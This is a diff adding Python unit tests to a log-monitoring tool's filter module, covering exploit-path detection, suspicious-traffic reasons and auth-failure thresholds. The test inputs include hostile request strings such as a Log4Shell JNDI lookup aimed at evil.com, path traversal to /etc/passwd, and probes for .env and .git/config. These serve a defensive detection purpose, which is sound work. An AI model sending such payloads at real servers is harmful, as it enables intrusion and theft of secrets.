@@ -7,6 +7,7 @@ from datetime import datetime, timezone
 
 from nethergaze.filters import (
     FilterState,
+    has_exploit_path,
     has_scanner_ua,
     parse_cidr_list,
     parse_status_code_spec,
@@ -289,3 +290,165 @@ class TestDescribe:
         desc = f.describe()
         assert "state:SYN_RECV" in desc
         assert '"test"' in desc
+
+
+# --- Exploit path detection ---
+
+
+class TestExploitPathDetection:
+    def test_env_probe(self):
+        assert has_exploit_path("/.env")
+
+    def test_wp_login(self):
+        assert has_exploit_path("/wp-login.php")
+
+    def test_wp_admin(self):
+        assert has_exploit_path("/wp-admin/install.php")
+
+    def test_jndi(self):
+        assert has_exploit_path("/${jndi:ldap://evil.com/x}")
+
+    def test_path_traversal(self):
+        assert has_exploit_path("/../../etc/passwd")
+
+    def test_etc_passwd(self):
+        assert has_exploit_path("/etc/passwd")
+
+    def test_git_exposure(self):
+        assert has_exploit_path("/.git/config")
+
+    def test_phpmyadmin(self):
+        assert has_exploit_path("/phpMyAdmin/index.php")
+
+    def test_cgi_bin(self):
+        assert has_exploit_path("/cgi-bin/test.cgi")
+
+    def test_normal_path(self):
+        assert not has_exploit_path("/index.html")
+
+    def test_normal_api(self):
+        assert not has_exploit_path("/api/v1/users")
+
+    def test_normal_css(self):
+        assert not has_exploit_path("/style.css")
+
+    def test_extra_patterns(self):
+        import re
+
+        extra = [re.compile(r"/custom-exploit", re.IGNORECASE)]
+        assert has_exploit_path("/custom-exploit", extra)
+        assert not has_exploit_path("/safe-path", extra)
+
+
+# --- Suspicious reasons ---
+
+
+class TestSuspiciousReasons:
+    def test_returns_reasons_for_scanner_ua(self):
+        f = FilterState(suspicious_mode=True)
+        p = _make_profile(user_agent="zgrab/0.x")
+        reasons = f.suspicious_reasons(p)
+        assert any("scanner UA" in r for r in reasons)
+
+    def test_returns_reasons_for_exploit_path(self):
+        f = FilterState(suspicious_mode=True)
+        p = _make_profile(ip="1.2.3.4")
+        entry = LogEntry(
+            remote_ip="1.2.3.4",
+            timestamp=datetime.now(timezone.utc),
+            method="GET",
+            path="/.env",
+            protocol="HTTP/1.1",
+            status_code=200,
+            bytes_sent=0,
+            referrer="-",
+            user_agent="test",
+        )
+        p.log_entries.append(entry)
+        reasons = f.suspicious_reasons(p)
+        assert any("exploit" in r for r in reasons)
+
+    def test_returns_reasons_for_burst_rate(self):
+        f = FilterState(suspicious_mode=True, suspicious_burst_rpm=50)
+        p = _make_profile(request_rate=100)
+        reasons = f.suspicious_reasons(p)
+        assert any("burst" in r for r in reasons)
+
+    def test_normal_traffic_no_reasons(self):
+        f = FilterState(suspicious_mode=True)
+        p = _make_profile(
+            connections=[_make_conn()],
+            total_requests=10,
+            request_rate=5.0,
+            user_agent="Mozilla/5.0",
+        )
+        reasons = f.suspicious_reasons(p)
+        assert reasons == []
+
+
+# --- Suspicious mode exploit path ---
+
+
+class TestSuspiciousExploitPath:
+    def test_exploit_path_triggers_suspicious(self):
+        f = FilterState(suspicious_mode=True)
+        p = _make_profile(ip="1.2.3.4")
+        entry = LogEntry(
+            remote_ip="1.2.3.4",
+            timestamp=datetime.now(timezone.utc),
+            method="GET",
+            path="/.env",
+            protocol="HTTP/1.1",
+            status_code=200,
+            bytes_sent=0,
+            referrer="-",
+            user_agent="test",
+        )
+        p.log_entries.append(entry)
+        assert f.matches_profile(p)
+
+    def test_normal_path_not_suspicious_alone(self):
+        f = FilterState(suspicious_mode=True)
+        p = _make_profile(ip="1.2.3.4", total_requests=5, request_rate=5.0)
+        entry = LogEntry(
+            remote_ip="1.2.3.4",
+            timestamp=datetime.now(timezone.utc),
+            method="GET",
+            path="/index.html",
+            protocol="HTTP/1.1",
+            status_code=200,
+            bytes_sent=100,
+            referrer="-",
+            user_agent="Mozilla/5.0",
+        )
+        p.log_entries.append(entry)
+        assert not f.matches_profile(p)
+
+
+# --- Auth failure suspicious ---
+
+
+class TestAuthFailureSuspicious:
+    def test_auth_failures_trigger_suspicious(self):
+        f = FilterState(suspicious_mode=True, suspicious_min_auth_failures=3)
+        p = _make_profile()
+        p.total_auth_failures = 5
+        assert f.matches_profile(p)
+
+    def test_low_auth_failures_not_suspicious(self):
+        f = FilterState(suspicious_mode=True, suspicious_min_auth_failures=3)
+        p = _make_profile(
+            connections=[_make_conn()],
+            total_requests=10,
+            request_rate=5.0,
+            user_agent="Mozilla/5.0",
+        )
+        p.total_auth_failures = 1
+        assert not f.matches_profile(p)
+
+    def test_auth_failures_in_reasons(self):
+        f = FilterState(suspicious_mode=True, suspicious_min_auth_failures=3)
+        p = _make_profile()
+        p.total_auth_failures = 10
+        reasons = f.suspicious_reasons(p)
+        assert any("auth failures" in r for r in reasons)
